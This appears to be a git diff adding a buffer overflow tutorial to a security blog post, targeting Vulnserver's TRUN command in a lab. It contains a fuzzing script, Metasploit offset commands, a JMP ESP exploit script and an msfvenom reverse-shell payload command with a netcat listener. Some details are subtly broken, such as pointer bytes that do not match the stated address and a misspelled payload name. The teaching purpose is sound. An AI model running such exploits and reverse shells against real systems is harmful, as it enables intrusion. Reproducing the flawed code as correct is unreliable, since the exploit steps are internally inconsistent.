@@ -75,37 +75,133 @@ To setup the environment, two hosts are required: a Kali Linux host and a Window
         ![Immunity Debugger - Buffer Overflow Example](/assets/img/posts/ETH/CAPEC/100_Experiment_ImmunityDBG.png "Immunity Debugger - Buffer Overflow Example")
 
     - **Craft overflow content:**
-      - Having identified that `TRUN` is vulnerable, the next step is to identify the exact byte count at which the the application crash occurs. A fuzzing script can be written and used against `TRUN` to step the fuzzing process, the below python script can be used to achieve this.
+      - Having identified that `TRUN` is vulnerable, the next step is to identify the exact byte count at which the the application crash occurs. A fuzzing script can be written and used against `TRUN` to step the fuzzing process, the below python script from the [TCM Academy - Practical Ethical Hacking](https://academy.tcm-sec.com/) course with the slight addition of creating variables for the target values.
 
         ```python
-        #!/usr/bin/python
+        #!/usr/bin/python3
         import sys, socket
         from time import sleep
 
-        ############### fuzzing script ##################
-
+        tInput = "TRUN /.:/"
         buffer = "A" * 100
+        tIp = '%IP%'
+        tPort = %PORT%
 
         while True:
             try:
 
                 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                s.connect(('172.16.70.134',9999))
+                s.connect((tIp,tPort))
 
-                s.send(('TRUN /.:/' + buffer))
+                payload = tInput + buffer
+
+                s.send((payload.encode()))
                 s.close
                 sleep(1)
                 buffer = buffer + "A"*100
 
             except:
-                print "Fuzzing crashed at %s bytes" % str(len(buffer))
+                print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
                 sys.exit()
         ```
         
-        Once the script has completed, the byte count will be printed to the terminal.
+        Once the script has completed, the byte count will be printed to the terminal. In this example, the application crashed at **3300 bytes** and did not overwrite another registers apart from the `EAX`.
+        - The next phase once the byte count has been determined is to identify the memory offset for the `EIP` register as it is the one in which requires to be overwritten with attacking code. Metasploit contains a module to create a pattern that will be used for the offset. Running the Metasploit module can be achieved via the below command with the switch `-l` indicating the byte count.
+
+            ```bash
+            /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3300
+            ```
+
+        - Copy the output of the command, and either create a new Python script or alter the previous one used for the byte count discovery as per the example snippet below. Paste the copied offset string into `%OFFSET%` and enter the `%IP%` and `%PORT%` details. 
+
+            ```python
+            #!/usr/bin/python3
+            import sys, socket
+
+            tInput = "TRUN /.:/"
+            offset = "%OFFSET%"
+            tIp = '%IP%'
+            tPort = %PORT%
+
+            try:
+
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect((tIp,tPort))
+
+                payload = tInput + offset
+
+                s.send((payload.encode()))
+                s.close
+                    
+            except:
+                print ("Error connecting to server")
+                sys.exit()
+            ```
+
+        - Run the python script and it should again cause the application to crash and identify the `EIP` register address within the Immunity Debugger output, which can be seen in the below image. Of particular note is the memory address of the `EIP` which in this example is `386F4337`.
+
+            ![Immunity Debugger - Buffer Overflow Example EIP](/assets/img/posts/ETH/CAPEC/100_Experiment_ImmunityDBG_EIP.png "Immunity Debugger - Buffer Overflow Example EIP")
+        
+        - With the memory address of the `EIP` register obtained, another metasploit similar to that run to create the offset pattern can be executed to find the exact point in which the `EIP` is located in the offset code. The Metasploit command is as follows with the switch `-l` indicating the byte count and `-q` representing the `EIP` memory location. Executing the tool will print the offset byte in which the `EIP` begins, in this example that is after **byte 2003**.
+
+            ```bash
+            /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3300 -q 386F4337
+            ```
+
+        - With the `EIP` identified, it is good practice to first identify any bad characters that could interfere with injected malicious shellcode. This specific example does not require this step, however further details can be found on this [Bulb Security](https://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) post about identifying any bad characters using Immunity Debugger. This section can also be performed after the next step as Mona.py contains a function `bytearray` to check for bad characters.
+        - The next phase of crafting the overflow content is to identify modules or .dll file that do not have any memory protections. [Mona.py](https://github.com/corelan/mona/blob/master/mona.py) is a plugin for Immunity Debugger that can be used to identify such modules. After downloading and moving the python script into the `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands` directory, restart Immunity Debugger and reattach the Vulnserver application. On the bottom portion of the Immunity Debugger is a command window, enter `!mona modules` to execute the plugin and run the modules function. Doing so will provide an output similar to that below. Note that the module `essFunc.dll` returns False against all checks, making it a prime candidate to abuse.
+
+            ![Immunity Debugger - Mona Modules](/assets/img/posts/ETH/CAPEC/100_Experiment_ImmunityDBG_Mona_Modules.png "Immunity Debugger - Mona Modules")
+
+        - With the previously identified module `essFunc.dll`, there are two other mona.py functions that can be run to identify pointers within the application that reference the module. First, the opcode for `JMP ESP` must be identified using `!mona assemble -s "JMP ESP"` which will output the opcode `\xff\xe4`. Using this opcode, the pointers can be printed for the module using `!mona find -s "\xff\xe4" -m essfunc.dll`. Ultimately, in this example, 9 pointers were identified that can be leveraged along with their attributed return memory addresses as per the image below. Any of the return addresses can be used, however `0x625011d3` is selected for this example.
+
+            ![Immunity Debugger - Mona essFunc.dll Pointers](/assets/img/posts/ETH/CAPEC/100_Experiment_ImmunityDBG_Mona_Pointers.png "Immunity Debugger - Mona essFunc.dll Pointers")
+        
+        - The previous Python script used comes into play once again, this time amending the contents or creating a new python script with the following changes. Note that the pointer variable contains the address `0x625011d3` converted to Hex and presented in [little-endian](https://www.techopedia.com/definition/12892/little-endian), meaning that the order is reversed, which is a requirement when dealing with application in the x86 format.
+
+            ```python
+            #!/usr/bin/python3
+            import sys, socket
+
+            tInput = b"TRUN /.:/"
+            pointer = b"\xaf\x11\x50\x62"
+            nopSled = b"\x90" * 32
+            overflow = b""
+            shellcode = b"A" * 2003 + pointer + nopSled + overflow
+            tIp = '%IP%'
+            tPort = %PORT%
+
+            try:
+
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect((tIp,tPort))
+
+                payload = tInput + shellcode
+
+                s.send((payload))
+                s.close
+                    
+            except:
+                print ("Error connecting to server")
+                sys.exit()
+            ```
+
+        - The Python script sets a jump condition to the `ESP` register, meaning that the `EIP` should be set to the memory address `0x625011d3`. The last stage is to now inject the malicious shellcode into the buffer overflow to exploit the application. For this example, a reverse TCP shell is being generated via the Metaploit payload generator, [Msfvenom](https://darkcybe.github.io/posts/Capabilities/#malware-development-with-msfvenom), via the below command. Replace the `%IP%` and `%PORT%` as necessary.
+
+            ```bash
+            msfvenom -p windows/shell_reverse_rcp LHOST=%IP% LPORT=%PORT% EXITFUNC=thread -f -c -a x86 -b "\x00"
+            ```
+
+            > The `-b` switch is used to list bad characters, if there are any additional they should be added. The example above depicts the NULL byte character.
+        
+        - Executing the Msfvenom command will output an unsigned char buf string, copy this code and add it to the python script as shown above within the `overflow` variable.
+
+3. Exploit
+        - The `shellcode` variable is now structured to complete the exploit. With an open a netcat listener (`nc -nvlp &PORT%`) on the port chosen, the exploit can be executed with the result being a root shell via the buffer overflow.
 
 # Sources
 - [TCM Academy - Practical Ethical Hacking](https://academy.tcm-sec.com/)
 - [Hacking - The Art of Exploitation 2nd Edition](https://www.amazon.com.au/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441)
 - [OWASP - Buffer Overflow Attack](https://owasp.org/www-community/attacks/Buffer_overflow_attack)
 - [Catharsis - Basic Buffer Overflow Guide](https://catharsis.net.au/blog/basic-buffer-overflow-guide/)
+- [Bulb Security - Finding Bad Characters with Immunity Debugger and Mona.py](https://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/)
